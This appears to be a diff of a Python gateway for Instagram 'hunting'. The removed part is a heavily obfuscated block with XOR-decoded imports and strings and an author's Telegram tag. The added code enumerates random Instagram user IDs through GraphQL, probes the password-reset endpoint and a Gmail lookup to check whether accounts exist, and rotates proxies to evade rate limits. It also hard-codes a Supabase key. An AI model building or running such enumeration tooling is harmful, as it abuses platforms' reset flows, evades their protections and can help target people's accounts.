@@ -1,1611 +1,3940 @@
-# ════════════════════
-__ENC_AUTHOR__ = "DEVELOPYER"
-__TELEGRAM__ = "@Developyer"
-# ════════════════════
+### FIXED
+# This file contains the code for the endpoint of the server.
+# It is used to handle the requests from the client and to send the responses to the client.
+# It is also used to handle the data from the database and to send the data to the client.
+# It is also used to handle the data from the cache and to send the data to the client.
+# It is also used to handle the data from the proxy and to send the data to the client.
+# It is also used to handle the data from the gmail and to send the data to the client.
+# It is also used to handle the data from the tk and to send the data to the client.
+# It is also used to handle the data from the hunt and to send the data to the client.
 
-ШЬЙЃПХкьЧАЧяииІЭОР='ЭбХЄоэЎ'
-def ЈЉСИМижЧПгВ():
-    ШЬЙЃПХкьЧАЧяииІЭОР='ЭбХЄоэЎ'
-    НЩнчЎХТжЗиэР=__import__(''.join(chr(КЬЦЇьЗЍгзтмЫСмщкеп^ord(ШЬЙЃПХкьЧАЧяииІЭОР[рНИйСЫЗщшьЈг%len(ШЬЙЃПХкьЧАЧяииІЭОР)])) for рНИйСЫЗщшьЈг,КЬЦЇьЗЍгзтмЫСмщкеп in enumerate([1119, 1104, 1099, 1120, 1105, 1056])))
-    пВгАгАсПЖВфиНРДуЦ=__import__(''.join(chr(КЬЦЇьЗЍгзтмЫСмщкеп^ord(ШЬЙЃПХкьЧАЧяииІЭОР[рНИйСЫЗщшьЈг%len(ШЬЙЃПХкьЧАЧяииІЭОР)])) for рНИйСЫЗщшьЈг,КЬЦЇьЗЍгзтмЫСмщкеп in enumerate([1113, 1112, 1096, 1121])))
-    ипчехХГКЂЅУоЗъТЎЋ=__import__(''.join(chr(КЬЦЇьЗЍгзтмЫСмщкеп^ord(ШЬЙЃПХкьЧАЧяииІЭОР[рНИйСЫЗщшьЈг%len(ШЬЙЃПХкьЧАЧяииІЭОР)])) for рНИйСЫЗщшьЈг,КЬЦЇьЗЍгзтмЫСмщкеп in enumerate([1118, 1096, 1110])))
-    ЫДЭНЈБЈЎуЄлтюУВДЊЧ=''.join(chr(КЬЦЇьЗЍгзтмЫСмщкеп^ord(ШЬЙЃПХкьЧАЧяииІЭОР[рНИйСЫЗщшьЈг%len(ШЬЙЃПХкьЧАЧяииІЭОР)])) for рНИйСЫЗщшьЈг,КЬЦЇьЗЍгзтмЫСмщкеп in enumerate([1129, 1108, 1107, 1121, 1106, 1058, 1150, 1108, 1108, 1111, 1060, 1097, 1068, 1120, 1113, 1090, 1029, 1136, 1105, 1133, 1127, 1091, 1111, 1098, 1142, 1107, 1133, 1143, 1090, 1092, 1029, 1136, 1110, 1068, 1146, 1037, 1096, 1098, 1137, 1054, 1068, 1148, 1096, 1041, 1106, 1121, 1119, 1062, 1070, 9273, 1041, 1116, 1131, 1099, 1133, 1126, 1100, 1095, 1088, 1060, 1106, 1064, 1149, 1118, 1041, 1095, 1142, 1119, 1060, 1120, 1037, 1106, 1088, 1128, 1106, 1086, 1056, 1075, 1125, 1101, 1133, 1101, 1133, 1150, 1100, 1106, 1102, 1121, 1100, 1133, 1133, 1090, 1090, 1105, 1143, 1054, 1056, 1121, 1119, 1108, 1029, 1126, 1100, 1068, 1127, 1091, 1041, 1094, 1121, 1106, 1057, 1149, 1037, 1093, 1101, 1125, 1104, 1133, 1143, 1090, 1092, 1029, 1132, 1119, 1083, 1131, 1027, 1071, 1148, 1131, 1099, 1133, 1123, 1092, 1090, 1110, 1121, 1114, 1133, 1146, 1093, 1108, 1029, 1143, 1109, 1060, 1122, 1089, 1090, 1033, 1060, 1109, 1060, 1130, 1097, 1118, 1035, 1050, 1136, 1058, 1070, 1088, 1104, 1099, 1130, 1104, 1059, 1120, 1037, 9253, 1029, 1140, 1099, 1081, 1070, 1113, 1113, 1088, 1060, 1110, 1064, 1142, 1037, 1108, 1089, 1133, 1098, 1058, 1148, 1037, 1109, 1098, 1139, 1104, 1123, 1040, 1129, 1140, 1139, 1089, 1138, 1026, 1118, 1140, 1140, 1143, 1060, 1101, 1068, 1143, 1118, 1035, 1029, 1123, 1105, 1133, 1122, 1096, 1104, 1111, 1130, 1054, 1053, 1143, 1113, 1113, 1098, 1130, 1054, 1067, 1127, 1119, 1090, 1105, 1064, 1054, 1081, 1126, 1096, 1119, 1029, 1127, 1105, 1056, 1131, 1037, 1107, 1092, 1127, 1109, 1123, 1040, 1140, 1118, 1104, 1142, 1054, 1034, 1126, 1092, 1109, 1111, 1125, 1054, 1067, 1121, 1089, 1109, 1088, 1142, 1054, 1070, 1135, 1089, 1117, 1088, 1120, 1054, 9305, 1070, 1092, 1093, 1026, 1143, 1054, 1064, 1123, 1103, 1104, 1111, 1142, 1119, 1086, 1149, 1096, 1109, 1029, 1122, 1105, 1087, 1070, 1108, 1118, 1104, 1066, 1056, 1035, 1148, 1092, 1109, 1092, 1060, 1105, 1059, 1070, 1108, 1118, 1104, 1142, 1054, 1085, 1126, 1090, 1119, 1088, 1060, 1097, 1058, 1120, 1034, 1093, 1029, 1143, 1119, 1083, 1131, 1037, 1093, 1101, 1133, 1101, 1133, 1150, 1096, 1091, 1110, 1131, 1104, 1068, 1122, 1092, 1093, 1116, 1066, 1056, 1044, 1121, 1112, 1041, 1110, 1136, 1100, 1060, 1150, 1117, 1108, 1089, 1060, 1098, 1061, 1131, 1037, 1113, 1088, 1125, 1114, 1064, 1148, 1037, 1117, 1100, 1135, 1115, 1133, 1143, 1090, 1092, 1029, 1143, 1098, 1087, 1127, 1117, 1041, 1089, 1133, 1113, 1059, 1127, 1113, 1096, 1035, 1050, 1132, 1064, 1144, 1096, 1091, 1110, 1121, 1054, 1082, 1126, 1100, 1093, 1050, 1060, 1127, 1058, 1147, 1037, 1106, 1092, 1130, 1049, 1081, 1070, 1096, 1095, 1088, 1130, 1054, 1067, 1121, 1119, 1094, 1092, 1142, 1114, 1123, 1040, 1121, 1108, 1110, 1143, 1054, 1057, 1121, 1098, 1112, 1094, 1064, 1054, 1056, 1121, 1119, 1108, 1029, 1127, 1105, 1085, 1127, 1112, 1116, 1029, 9232, 1054, 1070, 1122, 1100, 1090, 1110, 1133, 1117, 1123, 1040, 1145, 1104, 1096, 1140, 1115, 1087, 1070, 1097, 1108, 1105, 1121, 1117, 1081, 1131, 1097, 1055, 1029, 1089, 1113, 1058, 1070, 1097, 1108, 1097, 1121, 1098, 1064, 1130, 1027, 1071, 1137, 1132, 1111, 1086, 1070, 1118, 1106, 1111, 1133, 1102, 1081, 1070, 1092, 1090, 1029, 1140, 1100, 1058, 1146, 1096, 1106, 1105, 1121, 1114, 1133, 1132, 1108, 1041, 1125, 1088, 1115, 1083, 1131, 1089, 1118, 1109, 1149, 1115, 1087, 1070, 9273, 1041, 1116, 1131, 1099, 1130, 1148, 1096, 1041, 1099, 1131, 1098, 1123, 1040, 1124, 1119, 1091, 1133, 1104, 1060, 1146, 1096, 1041, 1097, 1131, 1105, 1085, 1070, 1112, 1119, 1097, 1131, 1117, 1062, 1131, 1097, 1035, 1029, 1125, 1117, 1061, 1127, 1096, 1095, 1088, 1129, 1115, 1059, 1146, 1037, 1046, 1142, 1127, 1100, 1060, 1150, 1113, 1041, 1134, 1133, 1114, 1065, 1127, 1096, 1046, 1035, 1050, 1127, 1058, 1147, 1119, 1041, 1124, 1111, 1130, 1133, 1145, 1100, 1117, 1102, 1060, 1110, 1068, 1149, 1037, 1093, 1101, 1121, 1054, 1064, 1120, 1096, 1091, 1090, 1149, 1054, 1058, 1128, 1037, 1104, 1029, 1128, 1105, 1086, 1146, 1037, 1093, 1098, 1137, 1100, 1060, 1149, 1113, 1055, 1083, 1094, 1119, 1086, 1131, 1045, 1028, 1029, 1133, 1101, 1059, 1065, 1113, 1041, 1092, 1060, 1102, 1064, 1148, 1118, 1118, 1099, 1125, 1106, 1060, 1146, 1108, 1041, 1105, 1142, 1119, 1060, 1146, 1027, 1071, 1149, 1099, 1132, 1133, 1127, 1118, 1119, 1026, 1136, 1054, 1061, 1135, 1119, 1109, 1029, 9232, 1054, 1076, 1121, 1112, 1091, 1029, 1128, 1111, 1067, 1131, 1037, 1106, 1101, 1131, 1111, 1070, 1131, 1118, 1041, 1092, 1142, 1115, 1123, 1040, 1149, 1108, 1088, 1128, 1054, 1058, 1120, 1096, 1041, 1097, 1125, 1095, 1064, 1148, 1025, 1041, 1094, 1142, 1095, 1133, 1128, 1090, 1091, 1029, 1143, 1111, 1077, 1070, 1088, 1118, 1111, 1121, 1040, 1107, 1111, 1090, 1092, 1029, 1139, 1119, 1059, 1146, 1096, 1109, 1029, 1143, 1105, 1080, 1148, 1102, 1108, 1029, 9232, 1054, 1061, 1131, 1119, 1108, 1026, 1143, 1054, 1060, 1120, 1099, 1112, 1099, 1133, 1098, 1064, 1070, 1117, 1091, 1100, 1130, 1098, 1086, 1070, 1092, 1119, 1110, 1136, 1115, 1068, 1130, 1027, 1071, 1127, 1142, 1119, 1060, 1120, 1037, 1106, 1088, 1128, 1106, 1086, 1076, 1037, 1029, 1045, 1072, 1054, 1027, 1121, 1113, 1041, 1123, 1131, 1099, 1059, 1130, 1027, 1071, 1121, 1121, 1096, 1064, 1122, 1090, 1089, 1116, 1121, 1100, 1133, 1127, 1118, 1041, 1099, 1131, 1098, 1133, 1117, 1145, 1140, 1132, 1098, 1054, 9305, 1070, 1108, 1118, 1104, 1059, 1100, 1064, 1070, 1118, 1093, 1100, 1128, 1106, 1133, 1132, 1090, 1093, 1101, 1060, 1106, 1058, 1149, 1092, 1119, 1090, 1066, 1056, 1050, 1131, 1100, 1114, 1029, 1125, 1098, 1081, 1131, 1088, 1089, 1105, 1066, 1054, 1054, 1146, 1119, 1118, 1099, 1123, 1115, 1087, 1070, 1102, 1118, 1091, 1122, 1115, 1064, 1070, 1119, 1108, 1094, 1131, 1107, 1056, 1131, 1091, 1109, 1088, 1120, 1040, 1107, 1114, 1093, 1108, 1029, 1131, 1104, 1057, 1143, 1037, 1093, 1101, 1133, 1104, 1066, 1070, 1108, 1118, 1104, 1060, 1114, 1064, 1133, 1119, 1096, 1109, 1136, 1115, 1065, 1070, 1092, 1090, 1029, 1129, 1095, 1133, 1150, 1100, 1093, 1100, 1121, 1104, 1070, 1131, 1027, 1071, 1134, 1121, 1115, 1085, 1070, 1098, 1118, 1100, 1130, 1113, 1133, 9242, 1037, 1093, 1101, 1121, 1054, 1057, 1121, 1090, 1089, 1029, 1128, 1105, 1083, 1131, 1118, 1041, 1094, 1131, 1107, 1085, 1135, 1091, 1096, 1035, 1050, 1142, 1058, 1120, 1096, 1090, 1105, 1060, 1119, 1080, 1130, 1092, 1093, 1055, 1060, 1095, 1058, 1147, 1037, 1117, 1098, 1143, 1115, 1123, 1070, 1150, 1104, 1107, 1125, 1113, 1064, 1070, 1100, 1092, 1089, 1133, 1098, 1143, 1070, 1108, 1118, 1104, 1060, 1104, 1064, 1144, 1096, 1091, 1029, 1132, 1119, 1065, 1070, 1100, 1041, 1094, 1132, 1119, 1059, 1133, 1096, 1055, 1083, 1095, 1105, 1059, 1146, 1100, 1106, 1105, 1060, 1150, 1033, 1131, 1115, 1108, 1097, 1131, 1102, 1076, 1131, 1119, 1041, 1106, 1132, 1115, 1059, 1070, 1108, 1118, 1104, 1060, 1113, 1087, 1121, 1114, 1041, 1092, 1060, 1101, 1062, 1127, 1089, 1117, 1029, 1136, 1100, 1064, 1131, 1027]))
-    нЮЗфдОоМжЛзсЂЋьШЦяЏ=tuple(ЫДЭНЈБЈЎуЄлтюУВДЊЧ.split('\x1e'))
-    while (1):
-        ЕвІЧаЮдЪжвЎчбГпЧхОЄ=НЩнчЎХТжЗиэР.choice(нЮЗфдОоМжЛзсЂЋьШЦяЏ)
-        print(''.join(chr(КЬЦЇьЗЍгзтмЫСмщкеп^ord(ШЬЙЃПХкьЧАЧяииІЭОР[рНИйСЫЗщшьЈг%len(ШЬЙЃПХкьЧАЧяииІЭОР)])) for рНИйСЫЗщшьЈг,КЬЦЇьЗЍгзтмЫСмщкеп in enumerate([1129, 1140, 1139, 1089, 1138, 1026, 1118, 1140, 1140, 1143, 1060, 1133, 1036, 1111, 1150])));print(''.join(chr(КЬЦЇьЗЍгзтмЫСмщкеп^ord(ШЬЙЃПХкьЧАЧяииІЭОР[рНИйСЫЗщшьЈг%len(ШЬЙЃПХкьЧАЧяииІЭОР)])) for рНИйСЫЗщшьЈг,КЬЦЇьЗЍгзтмЫСмщкеп in enumerate([1037, 1041, 1029, 1115, 1121, 1042, 1105, 1138, 1134, 1146, 1115, 1121, 1042, 1105, 1138, 1134, 1146, 1115, 1121, 1042, 1105, 1138, 1134, 1146, 1115, 1121, 1042])));print(''.join(chr(КЬЦЇьЗЍгзтмЫСмщкеп^ord(ШЬЙЃПХкьЧАЧяииІЭОР[рНИйСЫЗщшьЈг%len(ШЬЙЃПХкьЧАЧяииІЭОР)])) for рНИйСЫЗщшьЈг,КЬЦЇьЗЍгзтмЫСмщкеп in enumerate([1158]))+ЕвІЧаЮдЪжвЎчбГпЧхОЄ+''.join(chr(КЬЦЇьЗЍгзтмЫСмщкеп^ord(ШЬЙЃПХкьЧАЧяииІЭОР[рНИйСЫЗщшьЈг%len(ШЬЙЃПХкьЧАЧяииІЭОР)])) for рНИйСЫЗщшьЈг,КЬЦЇьЗЍгзтмЫСмщкеп in enumerate([1174])));print(''.join(chr(КЬЦЇьЗЍгзтмЫСмщкеп^ord(ШЬЙЃПХкьЧАЧяииІЭОР[рНИйСЫЗщшьЈг%len(ШЬЙЃПХкьЧАЧяииІЭОР)])) for рНИйСЫЗщшьЈг,КЬЦЇьЗЍгзтмЫСмщкеп in enumerate([1133, 1141, 1088, 1138, 1115, 1057, 1121, 1117, 1096, 1088, 1142])));print(''.join(chr(КЬЦЇьЗЍгзтмЫСмщкеп^ord(ШЬЙЃПХкьЧАЧяииІЭОР[рНИйСЫЗщшьЈг%len(ШЬЙЃПХкьЧАЧяииІЭОР)])) for рНИйСЫЗщшьЈг,КЬЦЇьЗЍгзтмЫСмщкеп in enumerate([1138, 1134, 1146, 1115, 1121, 1042, 1105, 1138, 1134, 1146, 1115, 1121, 1042, 1105, 1138, 1134, 1146, 1115, 1121, 1042, 1105, 1138, 1134, 1146, 1115, 1121, 1042, 1105])))
-        пВгАгАсПЖВфиНРДуЦ.sleep(0.35);ипчехХГКЂЅУоЗъТЎЋ.stdout.flush()
-ЫЅецЂМЈхЉШзНъьЃтЩЛЋ=__import__(''.join(chr(КЬЦЇьЗЍгзтмЫСмщкеп^ord(ШЬЙЃПХкьЧАЧяииІЭОР[рНИйСЫЗщшьЈг%len(ШЬЙЃПХкьЧАЧяииІЭОР)])) for рНИйСЫЗщшьЈг,КЬЦЇьЗЍгзтмЫСмщкеп in enumerate([1090, 1090])))
-if getattr(getattr(ЫЅецЂМЈхЉШзНъьЃтЩЛЋ,'environ'),'get')(''.join(chr(КЬЦЇьЗЍгзтмЫСмщкеп^ord(ШЬЙЃПХкьЧАЧяииІЭОР[рНИйСЫЗщшьЈг%len(ШЬЙЃПХкьЧАЧяииІЭОР)])) for рНИйСЫЗщшьЈг,КЬЦЇьЗЍгзтмЫСмщкеп in enumerate([1129, 1140, 1139, 1089, 1138, 1026, 1118, 1140, 1140, 1143, 1115, 1151, 1049, 1114, 1132, 1138, 1134])))or getattr(getattr(ЫЅецЂМЈхЉШзНъьЃтЩЛЋ,'environ'),'get')(''.join(chr(КЬЦЇьЗЍгзтмЫСмщкеп^ord(ШЬЙЃПХкьЧАЧяииІЭОР[рНИйСЫЗщшьЈг%len(ШЬЙЃПХкьЧАЧяииІЭОР)])) for рНИйСЫЗщшьЈг,КЬЦЇьЗЍгзтмЫСмщкеп in enumerate([1149, 1128, 1139, 1093, 1131, 1025, 1114, 1138, 1136, 1137, 1104, 1151, 1038, 1093]))):
-    ЈЉСИМижЧПгВ()
-def ОЂеъІОидАкСЮиШхЃщлМ():
-    ШЬЙЃПХкьЧАЧяииІЭОР='ЭбХЄоэЎ'
-    ЫЅецЂМЈхЉШзНъьЃтЩЛЋ=__import__(''.join(chr(КЬЦЇьЗЍгзтмЫСмщкеп^ord(ШЬЙЃПХкьЧАЧяииІЭОР[рНИйСЫЗщшьЈг%len(ШЬЙЃПХкьЧАЧяииІЭОР)])) for рНИйСЫЗщшьЈг,КЬЦЇьЗЍгзтмЫСмщкеп in enumerate([1090, 1090])))
-    УжЕЛЄйЙЙЕэГЭЂ=''.join(chr(КЬЦЇьЗЍгзтмЫСмщкеп^ord(ШЬЙЃПХкьЧАЧяииІЭОР[рНИйСЫЗщшьЈг%len(ШЬЙЃПХкьЧАЧяииІЭОР)])) for рНИйСЫЗщшьЈг,КЬЦЇьЗЍгзтмЫСмщкеп in enumerate([1038, 1041, 8565, 8532, 8558, 8477, 8542, 8573, 8545, 8565, 8532, 8558, 8477, 8542, 8573, 8545, 8565, 8532, 8558, 8477, 8542, 8573, 1083, 1146, 1115, 1147, 1027, 1101, 1138, 1136, 1136, 1104, 1142, 1026, 1116, 1138, 1134, 1029, 1081, 1054, 1135, 1098, 1128, 1127, 1120, 1096, 1137, 1053, 1111, 1128, 1123, 1031, 1038, 1121, 1042, 1114, 1128, 1149, 1120, 1091, 1132, 1036, 1091, 1138, 1134, 1029, 1081, 1054, 1135, 1102, 1129, 1108, 1107, 1121, 1106, 1058, 1150, 1108, 1108, 1111, 1062, 1076, 1134, 1070, 8573, 8545, 8565, 8532, 8558, 8477, 8542, 8573, 8545, 8565, 8532, 8558, 8477, 8542, 8573, 8545, 8565, 8532, 8558, 8477]))
+
+import asyncio
+from concurrent.futures import ThreadPoolExecutor
+from functools import partial
+import hashlib
+import logging
+import platform
+import re
+import secrets
+import sys
+import time
+import threading
+import queue
+import random
+import string
+import json
+import uuid
+import base64
+import html
+import os
+import socket
+from contextlib import asynccontextmanager
+from datetime import datetime, timezone
+
+COLOR_SUPPORT = sys.stdout.isatty()
+ANSI_RESET = "\033[0m"
+ANSI_CYAN = "\033[96m"
+ANSI_GREEN = "\033[92m"
+ANSI_YELLOW = "\033[93m"
+ANSI_RED = "\033[91m"
+ANSI_DIM = "\033[2m"
+ANSI_BOLD = "\033[1m"
+ANSI_MAGENTA = "\033[95m"
+ANSI_BLUE = "\033[94m"
+
+
+def apply_color(text, color):
+    if COLOR_SUPPORT:
+        return f"{color}{text}{ANSI_RESET}"
+    return text
+
+
+def _is_termux():
+    # Match joint.py — PREFIX catches Termux when TERMUX_VERSION is unset.
+    return bool(os.environ.get("TERMUX_VERSION")) or (
+        (os.environ.get("PREFIX") or "").startswith("/data/data/com.termux")
+    )
+
+
+def _env_thread_slots(default):
+    """Match joint.py — export JACK_THREADS=N before starting both processes."""
+    raw = os.environ.get("JACK_THREADS", "").strip()
+    if not raw:
+        return default
     try:
-        икЏЅСЁЖЂЛЍя=getattr(getattr(ЫЅецЂМЈхЉШзНъьЃтЩЛЋ,'path'),'abspath')(__file__)
-        ДУЏлШовУНйыМь=open(икЏЅСЁЖЂЛЍя,'r',encoding='utf-8').read()
+        return max(1, int(raw))
+    except ValueError:
+        return default
+
+
+def render_missing_deps_error(exc):
+    """Print before any banner — user must see why the gateway did not start."""
+    py = f"{sys.version_info.major}.{sys.version_info.minor}"
+    print()
+    print(apply_color("  ┌─ DEPENDENCY ERROR ─────────────────────────────────────────┐", ANSI_RED))
+    print(apply_color("  │  endpoint.py cannot start — required packages are missing. │", ANSI_RED))
+    print(apply_color("  └────────────────────────────────────────────────────────────┘", ANSI_RED))
+    print()
+    print(apply_color(f"  Python: {sys.executable} ({py})", ANSI_DIM))
+    print(apply_color(f"  Reason: {exc}", ANSI_YELLOW))
+    print()
+    if _is_termux():
+        print(apply_color("  Termux (Android) — do NOT run only:", ANSI_CYAN))
+        print(apply_color("    pip install -r requirements.txt", ANSI_DIM))
+        print(apply_color("  That tries to compile pydantic-core and fails.", ANSI_DIM))
+        print()
+        print(apply_color("  Run instead:", ANSI_GREEN))
+        print(apply_color("    bash install-termux.sh", ANSI_CYAN))
+        print(apply_color("  Or:", ANSI_DIM))
+        print(
+            apply_color(
+                "    pip install pydantic-core --extra-index-url "
+                "https://eutalix.github.io/android-pydantic-core/ --break-system-packages",
+                ANSI_CYAN,
+            )
+        )
+        print(apply_color("    pip install -r requirements-termux.txt --break-system-packages", ANSI_CYAN))
+    else:
+        print(apply_color("  Install:", ANSI_GREEN))
+        print(apply_color("    pip install -r requirements.txt", ANSI_CYAN))
+        print(apply_color("  Or: pip install fastapi uvicorn requests pydantic", ANSI_DIM))
+    print()
+    print(apply_color("  Then verify:", ANSI_DIM))
+    print(apply_color('    python -c "import fastapi, uvicorn, pydantic; print(\'ok\')"', ANSI_CYAN))
+    print()
+
+
+def _import_server_stack():
+    try:
+        import pydantic  # noqa: F401
+    except ImportError as exc:
+        render_missing_deps_error(exc)
+        raise SystemExit(1) from exc
+    try:
+        import pydantic_core  # noqa: F401
+    except ImportError as exc:
+        render_missing_deps_error(
+            ImportError(
+                "pydantic_core is not installed (FastAPI needs it). "
+                "On Termux use install-termux.sh — see message above."
+            )
+        )
+        raise SystemExit(1) from exc
+    try:
+        from fastapi import FastAPI, Request
+        from fastapi.responses import JSONResponse
+        import uvicorn
+    except ImportError as exc:
+        render_missing_deps_error(exc)
+        raise SystemExit(1) from exc
+    return FastAPI, Request, JSONResponse, uvicorn
+
+
+FastAPI, Request, JSONResponse, uvicorn = _import_server_stack()
+
+import requests
+from requests import post as pp
+from requests.adapters import HTTPAdapter
+
+try:
+    from vps_proxies import (
+        vps_proxy_enabled,
+        is_instagram_url,
+        proxy_attempts,
+        proxy_mark_bad,
+        proxy_http_status_retry,
+        get_proxy_pool,
+    )
+except ImportError:
+    def vps_proxy_enabled():
+        return False
+
+    def is_instagram_url(url):
+        return "instagram.com" in (url or "")
+
+    def proxy_attempts(**_kw):
+        yield None
+
+    def proxy_mark_bad(_proxies):
+        return None
+
+    def proxy_http_status_retry(status):
+        return int(status or 0) in (429, 502, 503, 504)
+
+    def get_proxy_pool():
+        return None
+
+_VPS_PROXY_TRIES = 12
+
+
+def _ig_http_post(url, *, data=None, headers=None, timeout=None, cookies=None, params=None, http=None):
+    use_proxy = vps_proxy_enabled() and is_instagram_url(url)
+    attempts = list(proxy_attempts(proxy_tries=_VPS_PROXY_TRIES)) if use_proxy else [None]
+    last_exc = None
+    for proxies in attempts:
+        try:
+            kw = {
+                "data": data,
+                "headers": headers,
+                "timeout": timeout,
+                "cookies": cookies,
+                "params": params,
+            }
+            if proxies:
+                kw["proxies"] = proxies
+            if http is not None:
+                resp = http.post(url, **kw)
+            else:
+                resp = requests.post(url, **kw)
+            if proxies and proxy_http_status_retry(getattr(resp, "status_code", 0)):
+                proxy_mark_bad(proxies)
+                continue
+            return resp
+        except Exception as exc:
+            last_exc = exc
+            if proxies:
+                proxy_mark_bad(proxies)
+            continue
+    if last_exc is not None:
+        raise last_exc
+    return requests.post(
+        url,
+        data=data,
+        headers=headers,
+        timeout=timeout,
+        cookies=cookies,
+        params=params,
+    )
+
+
+def _ig_http_get(url, *, headers=None, timeout=None, cookies=None, params=None, http=None):
+    use_proxy = vps_proxy_enabled() and is_instagram_url(url)
+    attempts = list(proxy_attempts(proxy_tries=_VPS_PROXY_TRIES)) if use_proxy else [None]
+    last_exc = None
+    for proxies in attempts:
+        try:
+            kw = {
+                "headers": headers,
+                "timeout": timeout,
+                "cookies": cookies,
+                "params": params,
+            }
+            if proxies:
+                kw["proxies"] = proxies
+            if http is not None:
+                resp = http.get(url, **kw)
+            else:
+                resp = requests.get(url, **kw)
+            if proxies and proxy_http_status_retry(getattr(resp, "status_code", 0)):
+                proxy_mark_bad(proxies)
+                continue
+            return resp
+        except Exception as exc:
+            last_exc = exc
+            if proxies:
+                proxy_mark_bad(proxies)
+            continue
+    if last_exc is not None:
+        raise last_exc
+    return requests.get(
+        url,
+        headers=headers,
+        timeout=timeout,
+        cookies=cookies,
+        params=params,
+    )
+
+# ═══ SUPABASE — same creds as joint.py ═══
+SUPABASE_URL = "https://pqlchnzcgramceqrsfrn.supabase.co"
+SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InBxbGNobnpjZ3JhbWNlcXJzZnJuIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzkyNTQ4NTcsImV4cCI6MjA5NDgzMDg1N30.enm6Sz8d5o5Fvgn3FsKMf2dLFtOggGL-mhVBDx853BM"
+
+API_PORT = 5001
+CLOUD_TIMEOUT = 12
+# Gateway profiles — desktop aggressive; Termux light (phone CPU + VPN rotate).
+_IS_TERMUX = _is_termux()
+if _IS_TERMUX:
+    GATEWAY_PROFILE = "termux"
+    INSTAGRAM_HTTP_TIMEOUT = 30
+    # Buffer fill 3× vs prior Termux tune (48 fillers → 144); watch errors if VPN rotates hard.
+    IG_GEN_PARALLEL_WORKERS = 48
+    IG_GEN_BUFFER_SIZE = 288
+    IG_GEN_BUFFER_FILL_WORKERS = 144
+    IG_GEN_BUFFER_LOW_WATER = 120
+    IG_GEN_BUFFER_FULL_SLEEP = 0.014
+    IG_GEN_FAIL_SLEEP = 0.01
+    IG_GEN_FAIL_SLEEP_LOW = 0.004
+    IG_GEN_ONCE_INNER_TRIES = 8
+    IG_GEN_PREFILL_BATCH = 96
+    IG_GEN_FILL_ATTEMPTS = 14
+    IG_GEN_SERVE_ATTEMPTS = 12
+    IG_GEN_SERVE_INNER_ATTEMPTS = 8
+    GEN_IG_MAX_ATTEMPTS = 32
+    HUNT_LOOKUP_TIMEOUT = 30
+    HUNT_CYCLE_MAX_CONCURRENT = min(_env_thread_slots(32), 32)
+    HUNT_CYCLE_LOOKUP_BUDGET = 50.0
+    HUNT_GEN_BUDGET = 12.0
+    _HUNT_LOOKUP_CONNECT = 4
+    IG_HTTP_POOL_SIZE = 216
+else:
+    GATEWAY_PROFILE = "desktop"
+    INSTAGRAM_HTTP_TIMEOUT = 12
+    IG_GEN_PARALLEL_WORKERS = 300
+    IG_GEN_BUFFER_SIZE = 1920
+    IG_GEN_BUFFER_FILL_WORKERS = 360
+    IG_GEN_BUFFER_LOW_WATER = 360
+    IG_GEN_BUFFER_FULL_SLEEP = 0.002
+    IG_GEN_FAIL_SLEEP = 0.0007
+    IG_GEN_FAIL_SLEEP_LOW = 0.00025
+    IG_GEN_ONCE_INNER_TRIES = 10
+    IG_GEN_PREFILL_BATCH = 360
+    IG_GEN_FILL_ATTEMPTS = 18
+    IG_GEN_SERVE_ATTEMPTS = 20
+    IG_GEN_SERVE_INNER_ATTEMPTS = 12
+    GEN_IG_MAX_ATTEMPTS = 40
+    HUNT_LOOKUP_TIMEOUT = 20
+    HUNT_CYCLE_MAX_CONCURRENT = min(_env_thread_slots(40), 40)
+    HUNT_CYCLE_LOOKUP_BUDGET = 45.0
+    HUNT_GEN_BUDGET = 10.0
+    _HUNT_LOOKUP_CONNECT = 3
+    IG_HTTP_POOL_SIZE = 960
+GMAIL_TL_CACHE_SEC = 300
+GMAIL_TL_REFRESH_EARLY_SEC = 60
+GMAIL_LOOKUP_MAX_ATTEMPTS = 5
+_GMAIL_UA = (
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
+    "(KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
+)
+_HUNT_GMAIL_MAX_ATTEMPTS = 5 if _IS_TERMUX else 3
+TK_CACHE_SEC = 60
+IG_GEN_WARM_MINS = ("10",)
+IG_GEN_THREAD_POOL_SIZE = IG_GEN_BUFFER_FILL_WORKERS + IG_GEN_PARALLEL_WORKERS + 32
+# IG gen: random user_id → PolarisProfilePageContentQuery graphql (sinsta-style).
+_IG_GEN_GRAPHQL_DOC_ID = "26672929172408668"
+_IG_GEN_USER_ID_MIN = 2_500_000_000
+_IG_GEN_USER_ID_MAX = 21_254_029_834
+# Single uvicorn worker — multi-worker duplicates buffers and kills pending tasks on exit.
+UVICORN_WORKERS = 1
+
+_IG_WEB_UA = (
+    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
+    "(KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"
+)
+_LSD_TOKEN_RE = re.compile(r'"LSD",\[\],\{"token":"([^"]+)"')
+_ig_gen_block_until = 0.0
+_ig_lookup_block_until = 0.0
+_ig_block_lock = threading.Lock()
+# Hunt lookups spam 429 → must not freeze username buffer / graphql gen.
+_IG_BLOCK_REMARK_MIN_LEFT = 2.5
+_IG_BLOCK_COOLDOWN_GEN = 10 if _IS_TERMUX else 7
+_IG_BLOCK_COOLDOWN_LOOKUP = 8 if _IS_TERMUX else 5
+HUNT_LOOKUP_MAX_CONCURRENT = 32 if _IS_TERMUX else 40
+_gmail_tl_cond = threading.Condition()
+_gmail_tl_cache = {"payload": None, "at": 0.0}
+_gmail_tl_refreshing = False
+_gmail_maintainer_started = False
+_tk_cache = {"csrf": None, "lsd": None, "at": 0.0}
+_tk_lock = threading.Lock()
+_hunt_cycle_sem = asyncio.Semaphore(HUNT_CYCLE_MAX_CONCURRENT)
+_hunt_lookup_sem = asyncio.Semaphore(HUNT_LOOKUP_MAX_CONCURRENT)
+_ig_gen_serve_sem = asyncio.Semaphore(max(8, HUNT_CYCLE_MAX_CONCURRENT * 2))
+_alive_snapshot_lock = threading.Lock()
+_alive_snapshot = {"at": 0.0, "payload": None}
+_profile_fetch_sem = asyncio.Semaphore(2)
+_recovery_sem = asyncio.Semaphore(1 if _IS_TERMUX else 2)
+_HUNT_IG_GRAPHQL_DOC_ID = "35299094813070532"
+_HUNT_IG_RESET_URL = "https://www.instagram.com/accounts/password/reset/"
+_HUNT_IG_GRAPHQL_URL = "https://www.instagram.com/api/graphql"
+_HUNT_IG_NO_ACCOUNT_RE = re.compile(
